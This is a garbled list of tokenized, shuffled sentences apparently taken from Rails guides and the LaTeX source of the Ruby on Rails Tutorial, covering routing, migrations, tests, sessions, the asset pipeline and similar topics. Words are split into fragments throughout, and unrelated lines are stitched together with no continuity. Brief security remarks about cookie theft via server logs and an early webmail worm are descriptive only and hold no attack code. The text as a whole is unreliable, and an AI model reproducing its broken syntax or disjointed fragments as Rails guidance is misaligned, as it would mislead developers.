▁@ comment ▁= ▁@ article ▖ comments ▖ find ( params [: id ])
▁belongs _ to ▁: con t in ent
▁As ▁with ▁the ▁signup ▁form , ▁we ▁can ▁test ▁the ▁signin ▁form ▁by ▁using ▁Capybara ▁to ▁fill ▁in ▁the ▁form ▁values ▁and ▁then ▁click ▁the ▁button .
▁gem ▁' blorgh ', ▁path : ▁" vendor / engine s / blorgh "
▁A ▁test ▁for ▁an ▁invalid ▁signup ▖
▁To ▁build ▁a ▁form ▁for ▁creating ▁microposts , ▁we ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : microposts _ home _ page }, ▁which ▁serve s ▁up ▁different ▁HTML ▁base d ▁on ▁whether ▁the ▁site ▁visit or ▁is ▁logged ▁in ▁or ▁not .
▁The ▁default ▁location ▁for ▁the ▁manifest ▁is ▁the ▁root ▁of ▁the ▁location ▁specified ▁in ╼` config ▖ assets ▖ prefix ` ▁( ' / assets ' ▁by ▁default ) .
▁You ▁can ▁use ▁this ▁method ▁when ▁you ▁want ▁to ▁say ▁that ▁the ▁object ▁is ▁invalid , ▁no ▁matter ▁the ▁values ▁of ▁its ▁attributes ▖
▁The ▁same ▁go es ▁for ▁\ k ode { rake }, ▁etc ▖ :
▁If ▁you ▁create ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁you ▁need ▁to ▁explicitly ▁create ▁the ▁join ing ▁table ▖
▁The ▁method ▁here ▁is ▁to ▁make ▁a ▁user ▁with ▁the ▁same ▁email ▁address ▁as ▁\ k ode {@ user } ▁using ▁\ k ode {@ user ▖ dup }, ▁which ▁creates ▁a ▁duplicate ▁user ▁with ▁the ▁same ▁attributes .
▁class ▁Create Account H ist or ies ▁< ▁ActiveRecord :: Migration
▁Then ▁we ▁can ▁make ▁the ▁corresponding ▁replace ment s ▁for ▁the ▁Help ▁and ▁About ▁pages ▁( Listing ~\ ref { code : help _ view _ erb _ title } ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title }) .
▁ W her e ▁`< attribute >` ▁is ▁the ▁attribute ▁you ▁as k ed ▁for ▖
▁Un like ▁plain ▁JavaScript ▁files , ▁ JS - ERb ▁files ▁also ▁allow ▁the ▁use ▁of ▁ Embedded ▁Ruby , ▁which ▁we ▁apply ▁in ▁the ▁\ k ode { create ▖ js ▖ erb } ▁file ▁to ▁update ▁the ▁follow ▁form ▁with ▁the ▁\ k ode { unfollow } ▁partial ▁( which ▁is ▁what ▁should ▁show ▁after ▁a ▁successful ▁following ) ▁and ▁update ▁the ▁ follower ▁count .
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁Rails ▁3▖1 ▖ 12 , ▁the ▁last ▁3▖1 ▖ x ▁version ▁of ▁Rails .
▁Even t u ally , ▁we ▁will ▁test ▁that ▁the ▁feed ▁returns ▁the ▁microposts ▁of ▁the ▁users ▁being ▁followed , ▁but ▁for ▁now ▁we ' ll ▁just ▁test ▁that ▁the ▁\ k ode { feed } ▁method ▁\ emph { includes } ▁the ▁current ▁user ' s ▁microposts ▁but ▁\ emph { exclude s } ▁the ▁posts ▁of ▁a ▁different ▁user .
▁The ▁default ▁value ▁is ▁`: log ` ▁in ▁development ▁and ▁test ▁ environments , ▁and ▁` false ` ▁in ▁all ▁other ▁ environments .
▁Because ▁email ▁format ▁validation ▁is ▁trick y ▁and ▁error - prone , ▁we ' ll ▁start ▁with ▁some ▁passing ▁tests ▁for ▁\ emph { valid } ▁email ▁addresses ▁to ▁catch ▁any ▁errors ▁in ▁the ▁validation .
▁When ▁making ▁Time ▁compar is on s ▁using ▁methods ▁which ▁h on or ▁the ▁user ▁time ▁ zone , ▁make ▁sure ▁to ▁use ▁` Time ▖ current ` ▁instead ▁of ▁` Time ▖ now ` ▖
▁do _ something _ else
▁And ▁we ' ll ▁also ▁add ▁one ▁to ▁the ▁` app / views / articles / show ▖ html ▖ erb ` ▁template ▁as ╼ we ll , ▁so ▁that ▁there ' s ▁also ▁an ▁" Edit " ▁link ▁on ▁an ▁article ' s ▁page ▖
▁</ head >
▁scope ▁ shallow _ path : ▁" sekret " ▁do
▁* ▁` ActionDispatch :: Callbacks ▖ to _ prepare ` ▁take s ▁a ▁block ▁to ▁run ▁after ▁` ActionDispatch :: Callbacks ▖ before `, ▁but ▁before ▁the ▁request ▖
▁rest ▁= ▁hash ▖ s li ce !( : a ) ▁# ▁=> ▁ { : b =>2}
▁resources ▁: photos , ▁: account s
▁ _ If ▁you ▁want ▁to ▁allow ▁custom ▁ color s ▁or ▁images , ▁you ▁can ▁allow ▁the ▁user ▁to ▁choose ▁them ▁and ▁build ▁the ▁CSS ▁in ▁the ▁web ▁application _ ▖
▁* ▁How ▁to ▁use ▁dynamic ▁find ers ▁methods .
▁This ▁section ▁gives ▁a ▁high - level ▁ overview ▁of ▁the ▁asset ▁pipeline ▁and ▁then ▁shows ▁how ▁to ▁use ▁a ▁re m ar k able ▁tool ▁for ▁making ▁CSS ▁called ▁\ emph { Sass }, ▁now ▁included ▁by ▁default ▁as ▁part ▁of ▁the ▁asset ▁pipeline .
▁The ▁data ▁model ▁then ▁appears ▁as ▁in ▁Figure ~\ ref { fig : user _ has _ many _ followers } .
▁E f fi ci en c y ▁in ▁production
▁Then ▁do ▁the ▁same ▁for ▁the ▁` app / views / articles / edit ▖ html ▖ erb ` ▁view :
▁You ▁need ▁to ▁b al ance ▁sever al ▁ factor s : ▁the ▁need ▁for ▁new ▁features , ▁the ▁increasing ▁difficult y ▁of ▁find ing ▁support ▁for ▁old ▁code , ▁and ▁your ▁available ▁time ▁and ▁ s kill s , ▁to ▁name ▁a ▁few .
▁First , ▁we ▁will ▁need ▁to ▁know ▁about ▁the ▁do ll ar - sign ▁syntax ▁to ▁access ▁a ▁ DOM ▁element ▁base d ▁on ▁its ▁unique ▁CSS ~ id .
▁class ▁ Category ▁< ▁ActiveRecord :: Base
▁If ▁you ▁need ▁to ▁use ▁a ▁do t ▁within ▁a ▁dynamic ▁segment , ▁add ▁a ▁constraint ▁that ▁override s ▁this ▁ – ▁for ▁example , ▁` id : ▁ / [ ^ \ / ] + / ` ▁allows ▁anything ▁except ▁a ▁ slash .
▁Rack ▁provides ▁a ▁minimal , ▁ mod ul ar ▁and ▁ adapt able ▁interface ▁for ▁developing ▁web ▁applications ▁in ▁Ruby ▖
▁That ▁complete s ▁the ▁comment ▁function ▁of ▁the ▁b logging ▁engine ▖
▁$ ▁ cd ▁active record
▁You ▁can ▁configure ▁your ▁own ▁ builder ▁with ▁the ▁`: builder ` ▁option ▖
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁10
▁time _ zone _ select ( ▁" user ", ▁" time _ zone ")
▁-- ----------------
▁If ▁you ' re ▁using ▁your ▁own ▁system ▁and ▁see ▁no ▁output ▁when ▁running ▁the ▁command ▁in ▁Listing ~\ ref { code : cat _ public _ key }, ▁follow ▁the ▁instructions ▁on ▁\ href { https :// co nfluence ▖ at la s s i an ▖ com / x / Y w V 9 E } { how ▁to ▁install ▁a ▁public ▁key ▁on ▁your ▁Bitbucket ▁account } .
▁ Adding ▁the ▁ uploader ▁to ▁the ▁Micropost ▁model ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ picture } .
▁But ▁the ▁whole ▁point ▁of ▁using ▁ bcrypt ▁is ▁for ▁hash ing ▁to ▁be ▁ ir reversible , ▁so ▁this ▁can ' t ▁be ▁right .
▁# ▁location : ▁' / us r / s bin / sendmail ',
▁class ▁B ▁< ▁C ; ▁end
▁We ' ll ▁start ▁by ▁adding ▁a ▁`` forgot ▁password '' ▁link ▁to ▁the ▁sample ▁application ' s ▁login ▁form ▁( Figure ~\ ref { fig : login _ forgot _ password _ mockup }) .
▁end _ of _ quarter ▁( at _ end _ of _ quarter )
▁Here , ▁the ▁` _ ad _ banner ▖ html ▖ erb ` ▁and ▁` _ footer ▖ html ▖ erb ` ▁partials ▁could ▁contain ▁content ▁that ▁is ▁ shared ▁a mong ▁many ▁pages ▁in ▁your ▁application ▖
▁by te s
▁as ▁show n ▁in ▁Listing ~\ ref { code : generate _ user _ mailer } .
▁The ▁syntax ▁is ▁ potentially ▁confusing , ▁and ▁it ' s ▁important ▁to ▁understand ▁that ▁in ▁the ▁code ▁above ▁only ▁\ emph { one } ▁of ▁the ▁lines ▁get s ▁executed .
▁This ▁means ▁that ▁the ▁\ emph { routing } ▁works , ▁but ▁the ▁corresponding ▁pages ▁don ' t ▁necessar ily ▁work ▁at ▁this ▁point .
▁We ' ll ▁learn ▁how ▁to ▁model ▁such ▁user ▁relationships , ▁and ▁see ▁the ▁implications ▁for ▁the ▁microposts ▁feed , ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁ ╼ ▁> > ▁1▖ year ▖ from _ now
▁It ' s ▁worth ▁ ment ion ing ▁that ▁the ▁content ▁need ▁not ▁be ▁an ▁exact ▁match ; ▁any ▁sub string ▁works ▁as ▁well , ▁so ▁that
▁The ▁find ▁would ▁then ▁take ▁the ▁form :
▁Defaults ▁to ▁`: file _ store ` ▁if ▁the ▁directory ▁` t mp / cache ` ▁exists , ▁and ▁to ▁`: memory _ store ` ▁otherwise .
▁The ▁first ▁step ▁in ▁adding ▁custom ▁CSS ▁to ▁our ▁application ▁is ▁to ▁open ▁a ▁file ▁to ▁contain ▁it :
▁At te mp t s ▁to ▁install ▁ 2▖1 ▖ 5 ▁also ▁failed .
▁By ▁default , ▁the ▁engine ' s ▁controllers ▁inherit ▁from ╼` Blorgh :: Application Controller ` ▖
▁get ▁' こんにちは ', ▁controller : ▁' welcome ', ▁action : ▁' index '
▁< a ▁ href ="# " ▁on click =" this ▖ style ▖ backgroundColor =' # 99 0 000 ' "> P aint ▁it ▁red </ a >
▁And ▁then ▁on ▁our ▁page :
▁╼╼ %= ▁ lang : console ╼\ begin { code } ╼ $ ▁git ▁ checkout ▁- b ▁ filling - in - layout ╼\ end { code }╼╼ ▁\ subsection { Site ▁navigation } ▁% ▁( fold )╼ ▁\ label { sec : adding _ to _ the _ layout }╼╼ As ▁a ▁first ▁step ▁toward ▁adding ▁links ▁and ▁style s ▁to ▁the ▁sample ▁application , ▁we ' ll
▁It ' s ▁common ▁to ▁have ▁resources ▁that ▁are ▁logic ally ▁ child re n ▁of ▁other ▁resources ▖
▁We ▁left ▁Section ~\ ref { sec : unsuccessful _ edit s } ▁with ▁a ▁working ▁edit ▁form .
▁=> ▁[" foo ", ▁" bar ", ▁" baz "]
▁B oth ▁` next _ week ` ▁and ▁` prev _ week ` ▁work ▁as ▁expected ▁when ▁` Date ▖ beginning _ of _ week ` ▁or ▁` config ▖ beginning _ of _ week ` ▁are ▁set .
▁Rails ▁now ▁creates ▁routes ▁to ▁the ▁` C ate g or ies Controller ` .
▁<% ▁end ▁%>
▁All ▁of ▁these ▁less on s , ▁of ▁course , ▁apply ╼ to ▁ v a nil la ▁JavaScript ▁as ▁well .
▁Ou r ▁first ▁step ▁is ▁to ▁generate ▁an ▁integration ▁test ▁as ▁usual :
▁As ▁with ▁sessions ▁( Section ~\ ref { sec : sessions _ and _ failed _ signin }), ▁we ' ll ▁model ▁account ▁ activations ▁as ▁a ▁resource ▁even ▁though ▁they ▁won ' t ▁be ▁ associated ▁with ▁an ▁Active ▁Record ▁model .
▁You ▁may ▁notice ▁that ▁there ▁are ▁more ▁actions ▁than ▁there ▁are ▁pages ; ▁the ▁\ k ode { index }, ▁\ k ode { show }, ▁\ k ode { new }, ▁and ▁\ k ode { edit } ▁actions ▁all ▁correspond ▁to ▁pages ▁from ▁Section ~\ ref { sec : a _ user _ tour }, ▁but ▁there ▁are ▁ additional ▁\ k ode { create }, ▁\ k ode { update }, ▁and ▁\ k ode { destroy } ▁actions ▁as ▁well .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` collection ▖ build ` ▁method .
▁For ▁example :
▁Testing ▁for ▁the ▁\ k ode { : name } ▁and ▁\ k ode { : email } ▁attributes .
▁#### ▁` app ` ▁D ir ec to ry
▁More over , ▁by ▁using ▁\ k ode { get } ▁we ▁arrange ▁for ▁the ▁route ▁to ▁respond ▁to ▁a ▁\ text tt { GET } ▁request , ▁which ▁is ▁one ▁of ▁the ▁f un d a ment al
▁Note ▁also ▁the ▁use ▁of ▁\ k ode {@ user ▖ reload } ▁( first ▁seen ▁in ▁Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁ reload ▁the ▁user ' s ▁values ▁from ▁the ▁database ▁and ▁confirm ▁that ▁they ▁were ▁successfully ▁updated .
▁Note ▁how ▁similar ▁the ▁final ▁step ▁is ▁to ▁logging ▁a ▁user ▁in , ▁where ▁we ▁retrieve ▁the ▁user ▁by ▁email ▁address ▁and ▁then ▁verify ▁( using ▁the ▁\ k ode { authenticate } ▁method ) ▁that ▁the ▁submitted ▁password ▁matches ▁the ▁password ▁digest ▁( Listing ~\ ref { code : log _ in _ success }) .
▁After ▁restart ing ▁S ublime ▁Text , ▁the ▁Ruby Test ▁package ▁ s up p li es ▁the ▁following ▁commands :
▁S ince ▁we ▁have ▁already ▁done ▁one ▁push ▁( Section ~\ ref { sec : bitbucket }), ▁on ▁most ▁systems ▁we ▁can ▁omit ▁\ k ode { origin ▁master }, ▁and ▁simply ▁run ▁\ k ode { git ▁push } :
▁A lthough ▁REST ▁the or y ▁is ▁rather ▁abstract , ▁in ▁the ▁context ▁of ▁Rails ▁applications ▁REST ▁means ▁that ▁most ▁application ▁ components ▁( such ▁as ▁users ▁and ▁microposts ) ▁are ▁model ed ▁as ▁\ emph { resources } ▁that ▁can ▁be ▁created , ▁read , ▁updated , ▁and ▁delete d --- o p er ation s ▁that ▁correspond ▁both ▁to ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Create , _ read , _ update _ and _ delete } { CRUD ▁operations ▁of ▁relation al ▁database s } ▁and ▁four ▁f un d a ment al ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP ▁request ▁methods } : ▁\ text tt { POST }, ▁\ text tt { GET }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE } ▖ ▁(
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁ increment ed ▁following ▁count .
▁\ emph { URI } ▁stand s ▁for ▁ Uni form ▁Resource ▁I d ent if i er , ▁while ▁the ▁slightly ▁less ▁general ▁\ emph { URL } ▁stand s ▁for ▁ Uni form ▁Resource ▁L o cat or .
▁The ▁code ▁\ k ode { user ▖ microposts ▖ build (▖▖▖) } ▁returns ▁a ▁new ▁Micropost ▁object ▁automatically ▁ associated ▁with ▁the ▁given ▁user .
▁Rails ' ▁\ k ode { has \_ many ▁: through } ▁allows ▁the ▁ modeling ▁of ▁complicated ▁data ▁relationships .
▁To ▁un if y ▁these ▁cases , ▁we ▁can ▁pass ▁the ▁form ▁variable ~\ k ode { f } ▁to ▁the ▁partial ▁and ▁access ▁the ▁ associated ▁object ▁through ▁\ k ode { f ▖ object }, ▁so ▁that ▁in
▁Note ╼ that ▁each ▁ associated ▁object ▁will ▁contain ▁its ▁own ▁` errors ` ▁collection ; ▁errors ▁do ╼ not ▁b ub b le ▁up ▁to ▁the ▁calling ▁model .
▁ Adding ▁sample ▁microposts ▁for ▁\ emph { all } ▁the ▁users ▁actually ▁take s ▁a ▁rather ▁long ▁time , ▁so ▁first ▁we ' ll ▁select ▁just ▁the ▁first ▁ s i x ▁users ▁( i ▖ e ▖ , ▁the ▁f ive ▁users ▁with ▁custom ▁Gravatar s , ▁and ▁one ▁with ▁the ▁default ▁Gravatar ) ▁using ▁the ▁\ k ode { take } ▁method :
▁If ▁the ▁first ▁matching ▁route ▁is :
▁ foo ▁: ▁bar
▁Ou r ▁first ▁step ▁is ▁to ▁write ▁a ▁failing ▁test ▁for ▁the ▁About ▁page .
▁route ▁resources ▁: users
▁Note ▁from ▁Table ~\ ref { table : demo _ RESTful _ users } ▁that ▁there ▁is ▁some ▁ overlap ▁in ▁the ▁URLs ; ▁for ▁example , ▁both ▁the ▁user ▁\ k ode { show } ▁action ▁and ▁the ▁\ k ode { update } ▁action ▁correspond ▁to ▁the ▁URL ▁ / users /1 .
▁But ▁the ▁attacker ▁can ▁review ▁their ▁web ▁server ' s ▁access ▁log ▁files ▁to ▁see ▁the ▁victim ' s ▁cookie .
▁We ' ll ▁then ▁use ▁the ▁failing ▁test ▁to ▁d r ive ▁the ▁writing ▁of ▁the ▁application ▁code .
▁#### ▁` take `
▁* ▁` customers / _ customer ▖ html ▖ erb `
▁You ▁can ▁also ▁pass ▁in ▁a ▁` layout : ▁' layout _ name ' ` ▁option ▁to ▁the ▁render ▁call ▁inside ╼ the ▁format ▁block ▁to ▁specify ▁different ▁ layouts ▁for ▁different ▁format s :
▁no ▁changes ▁added ▁to ▁commit ▁( use ▁" git ▁add " ▁and / or ▁" git ▁commit ▁- a ")
▁TIP : ▁For ▁further ▁details ▁have ▁a ▁look ▁at ▁the ▁ docs ▁of ▁your ▁production ▁web ▁server :
▁This ▁prevent s ▁user less ▁microposts ▁from ▁being ▁ str and ed ▁in ▁the ▁database ▁when ▁admin s ▁choose ▁to ▁remove ▁users ▁from ▁the ▁system .
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ r c 2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁Inde ed , ▁the ▁Bootstrap ▁framework ▁defines ▁a ▁large ▁number ▁of ▁variables ▁for ▁ color s , ▁available ▁online ▁on ▁the ▁\ href { http :// bootstrap docs ▖ com / v 2▖0▖ 4/ docs / less ▖ html } { Bootstrap ▁page ▁of ▁ LESS ▁variables } .
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation }) ▁it ' s ▁important ▁to ▁test ▁it .
▁To ▁check ▁that ▁the ▁new ▁test ▁in ▁Listing ~\ ref { code : layout _ links _ test } ▁passes , ▁we ▁can ▁run ▁just ▁the ▁integration ▁tests ▁using ▁the ▁following ▁Rake ▁task :
▁ Technical ly , ▁Rails ▁convert s ▁the ▁argument ▁of ▁\ k ode { has \_ many } ▁to ▁a ▁class ▁name ▁using ▁the ▁\ k ode { classify } ▁method , ▁which ▁convert s ▁\ k ode {" foo \_ bar s "} ▁to ▁\ k ode {" FooBar "} .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / de le g ation ▖ rb `
▁to : ▁' static _ pages # contact ' ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁rails _ routes ▁( end )╼╼ ▁\ subsection { U s ing ▁named ▁routes } ▁% ▁( fold )╼ ▁\ label { sec : name d _ routes }╼╼
▁( We ▁won ' t ▁be ▁using ▁Sass ▁un til ▁Section ~\ ref { sec : sass }, ▁but ▁it ' s ▁needed ▁now ▁for ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁to ▁work ▁its ▁magic ▖)
▁" dude "▖ pluralize (2) ▁# ▁=> ▁" dude s "
▁### ▁Testing ▁Patch es
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation .
▁Your ▁goal ▁should ▁be ▁to ▁create ▁and ▁configure ▁both ▁the ▁development ▁database ▁and ▁the ▁test ▁database ▁to ▁use ▁PostgreSQL .
▁This ▁links ▁the ▁folder ▁specified ▁in ▁` config ▖ assets ▖ prefix ` ▁to ▁` shared / assets ` .
▁Extensions ▁to ▁` BigDecimal `
▁You ▁can ▁add ▁a ▁new ▁middleware ▁to ▁the ▁middleware ▁ stack ▁using ▁any ▁of ▁the ▁following ▁methods :
▁U s u ally ▁M ac ▁OS ▁X ▁and ▁Windows ▁come ▁with ▁a ▁JavaScript ▁run time ▁installed ▖╼
▁# ▁Defin es ▁the ▁matching ▁rules ▁for ▁Guard .
▁as ▁show n ▁in ▁Listing ~\ ref { code : curl _ rails _ png } .
▁end ▁of ▁ regex
▁On ce ▁you ▁have ▁configured ▁your ▁server ▁and ▁your ▁CDN ▁when ▁you ▁serve ▁a ▁web page ▁that ╼ has ▁an ▁asset :
▁Let ' s ▁see ▁if ▁our ▁\ k ode { save } ▁changed ▁anything :
▁With ▁the ▁added ▁integration ▁test ▁for ▁layout ▁links , ▁we ▁are ▁now ▁in ▁a ▁good ▁position ▁to ▁catch ▁re gr ess ion s ▁quickly ▁using ▁our ▁test ▁suite .
▁If ▁you ▁don ' t ▁want ▁to ▁use ▁a ▁generator , ▁you ▁could ▁create ▁your ▁own ▁file ▁inside ▁of ╼` app / job s `, ▁just ▁make ▁sure ▁that ▁it ▁inherit s ▁from ▁` ActiveJob :: Base ` .
▁In ▁contrast ▁to ▁the ▁ persistent ▁cookie ▁created ▁by ▁the ▁\ k ode { cookies } ▁method ▁( Section ~\ ref { sec : remember _ me }), ▁the ▁temporary ▁cookie ▁created ▁by ▁the ▁\ k ode { session } ▁method ▁ expire s ▁immediately ▁when ▁the ▁browser ▁is ▁close d .
▁ head ▁: created , ▁location : ▁ photo _ path (@ photo )
▁ ex abytes
▁As ▁a ▁result ▁of ▁the ▁callback , ▁when ▁a ▁new ▁user ▁is ▁defined ▁with ▁\ k ode { User ▖ new } ▁( as ▁in ▁user ▁signup , ▁Listing ~\ ref { code : create _ action _ strong _ parameters }), ▁it ▁will ▁automatically ▁get ▁both ▁\ k ode { activation \_ token } ▁and ▁\ k ode { activation \_ digest } ▁attributes ; ▁because ▁the ▁latter ▁is ▁ associated ▁with ▁a ▁column ▁in ▁the ▁database ▁( Figure ~\ ref { fig : user _ model _ account _ activation }), ▁it ▁will ▁be ▁written ▁automatically ▁when ▁the ▁user ▁is ▁saved .
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁That ' s ▁re m ar k ably ▁important ▁for ▁libraries .
▁Rails ▁ 2▖1 ▖ 2 ▁escape s ▁these ▁characters ▁for ▁the ▁ Location ▁field ▁in ▁the ▁` redirect _ to ` ▁method ▖
▁In ▁the ▁process , ▁we ' ll ▁learn ▁about ▁some ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails , ▁including ▁image ▁upload , ▁custom ▁database ▁queries , ▁and ▁advanced ▁data ▁ modeling ▁with ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁: through } .
▁( Test ing ▁for ▁this ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ friendly _ forwarding })▖)
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁toy ▁app .
▁# ▁If ▁you ' re ▁not ▁using ▁ActiveRecord , ▁or ▁you ' d ▁prefer ▁not ▁to ▁run ▁each ▁of ▁your
▁This ▁update s ▁the ▁database ▁at ▁Heroku ▁with ▁the ▁necessary ▁user / micropost ▁data ▁model .
▁Active ▁Record ▁in s ul ate s ▁you ▁from ▁the ▁need ▁to ▁use ▁SQL ▁in ▁most ▁cases .
▁2▖ ordinal ▁# ▁=> ▁" nd "
▁# ▁I gnore ▁ bundler ▁config .
▁The ▁default ▁middleware s ▁show n ▁here ▁( and ▁some ▁other s ) ▁are ▁each ▁summariz ed ▁in ▁the ▁[ In ter n al ▁ Middleware s ](# internal - middleware - stack ) ▁section , ▁below .
▁now ▖ change ( m in : ▁0 )
▁Over ▁the ▁course ▁of ▁the ▁next ▁f ive ▁chapter s , ▁we ' ll ▁ ful fi ll ▁the ▁pro mis e ▁ implicit ▁in ▁this ▁in ci p i ent ▁signup ▁page .
▁sign _ out
▁This ▁uses ▁the ▁\ k ode { to } ▁method ▁because ▁we ▁expect ▁a ▁click ▁on ▁the ▁signup ▁button ▁with ▁valid ▁data ▁\ emph { to } ▁change ▁the ▁user ▁count ▁by ▁one .
▁If ▁a ▁change ▁is ▁related ▁to ▁a ▁specific ▁issue , ▁you ▁should ▁a tt a ch ▁the ▁issue ' s ▁number ▖
▁Note ▁how ▁similar ▁the ▁final ▁step ▁is ▁to ▁logging ▁a ▁user ▁in , ▁where ▁we ▁retrieve ▁the ▁user ▁by ▁email ▁address ▁and ▁then ▁verify ▁( using ▁the ▁\ k ode { authenticate } ▁method ) ▁that ▁the ▁submitted ▁password ▁matches ▁the ▁password ▁digest ▁( Listing ~\ ref { code : find _ authenticate _ user }) .
▁This ▁test ▁does ▁the ▁same ▁thing ▁as ▁the ▁first ▁duplicate ▁email ▁test , ▁but ▁with ▁an ▁upper - case ▁email ▁address ▁instead .
▁This ▁is ▁due ▁to ▁the ▁setup ▁of ▁the ▁testing ╼ environment ; ▁an ▁engine ▁needs ▁an ▁application ▁as ▁a ▁host ▁for ▁testing ▁its ▁main ╼ function al ity , ▁es pecially ▁controllers ▖
▁As ▁with ▁the ▁other ▁features ▁of ▁our ▁sample ▁app , ▁we ' ll ▁add ▁User ▁model ▁validations ▁using ▁test - driven ▁development .
▁### ▁` strip _ her e doc `
▁person ▖ errors ▖ size ▁# ▁=> ▁2
▁O p en ing ▁a ▁new ▁terminal ▁ tab .
▁When ▁making ▁views , ▁we ' ll ▁focus ▁on ▁the ▁ visual ▁appearance ▁and ▁not ▁worry ▁too ▁much ▁about ▁the ▁exact ▁structure ▁of ▁the ▁page , ▁which ▁means ▁that ▁( at ▁least ▁for ▁now ) ▁we ▁won ' t ▁be ▁writing ▁tests .
▁If ▁you ▁choose ▁not ▁to ▁make ▁them ▁gems , ▁you ▁can ▁move ▁them ▁into , ▁say , ▁` lib / my _ plugin /* ` ▁and ▁add ▁an ▁appropriate ▁initializer ▁in ▁` config / initializers / my _ plugin ▖ rb ` .
▁We ▁can ▁also ▁verify ▁that ▁the ▁\ k ode { authenticate } ▁command ▁is ▁working ▁by ▁first ▁using ▁an ▁invalid ▁password ▁and ▁then ▁a ▁valid ▁one :
▁Time ▖ local (200 0, ▁10 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Mon , ▁30 ▁Oct ▁2000
▁ RE presentational ▁ State ▁ Transfer ▁( REST )
▁has _ many ▁: orders , ▁-> ▁ { ▁order ▁" date _ confirmed ▁DESC " ▁ }
▁L oo k ing ▁at ▁the ▁Bootstrap ▁variable ▁page , ▁we ▁see ▁that ▁there ▁is ▁a ▁variable ▁for ▁light ▁gra y :
▁The ▁\ k ode { current \_ user ?}
▁Rails ▁does ▁have ▁some ▁good ▁reason s ; ▁for ▁example , ▁in ▁web ▁applications ▁we ▁often ▁want ▁to ▁prevent ▁variables ▁from ▁being ▁\ emph { blank } --- e ▖ g ▖ , ▁a ▁user ' s ▁name ▁should ▁be ▁something ▁other ▁than ▁spaces ▁and ▁other ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / W h ite space _ ( computer _ science )} { white space } --- so ▁Rails ▁add s ▁a ▁\ k ode { blank ?}\ ▁method ▁to ▁Ruby .
▁Client ▖ where ( first _ name : ▁' does ▁not ▁exist ')▖ take !
▁Testing ▁Relationship ▁creation ▁and ▁attributes .
▁Rails ▁comes ▁with ▁a ▁number ▁of ▁ script s ▁called ▁generator s ▁that ▁are ▁design ed ▁to ▁make ╼ your ▁development ▁ life ▁easier ▁by ▁creating ▁everything ▁that ' s ▁necessary ▁to ▁start ╼ working ▁on ▁a ▁particular ▁task ▖
▁If ▁possible , ▁use ▁ UT F -8 ▁as ▁the ▁ internal ▁ storage ▁of ▁your ▁database .
▁ PUT ▁ / articles / : id (▖ : format ) ▁articles # update
▁Date ▖ new (200 0, ▁5 , ▁31)▖ next _ month ▁# ▁=> ▁Fri , ▁30 ▁Jun ▁2000
▁> > ▁p ▁= ▁Person ▖ create
▁#### ▁Co ll ec tion ▁ Partial ▁Layouts
▁It ▁appear ed ▁on ▁Jun e ▁ 11 , ▁ 2006 ▁and ▁was ▁the ▁first ▁web mail ▁interface ▁worm :
▁* ▁` action _ controller ▖ initialize _ framework _ cache s ` ▁Set s ▁` ActionController :: Base ▖ cache _ store ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails ▖ cache ` .
▁* ▁` config ▖ action _ view ▖ field _ error _ proc ` ▁provides ▁an ▁HTML ▁generator ▁for ▁display ing ▁errors ▁that ▁come ▁from ▁Active ▁Record ▖
▁As ▁in ▁Section ~\ ref { sec : user _ validations }, ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests } ▁uses ▁string ▁ multi plication ▁to ▁test ▁the ▁micropost ▁length ▁validation :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ model _ activation _ code }
▁This ▁third ▁ edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁a im s ▁to ▁lower ▁the ▁bar ri er ▁to ▁getting ▁started ▁with ▁Rails ▁in ▁a ▁number ▁of ▁ways :
▁This ▁will ▁make ▁it ▁much ▁simple r ▁to ▁remove ▁all ▁the ▁repetition ▁at ▁a ▁ str o k e .
▁The ▁first ▁case ▁applies ▁to ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions , ▁and ▁so ▁logic ally ▁belongs ▁in ▁a ▁before ▁filter ▁( Listing ~\ ref { code : password _ reset _ update _ action }) .
▁render ▁action : ▁" regular _ show "
▁A ▁configuration ▁file ▁for ▁\ href { http :// rack ▖ ruby for ge ▖ org / doc /}{ Rack ▁middleware }
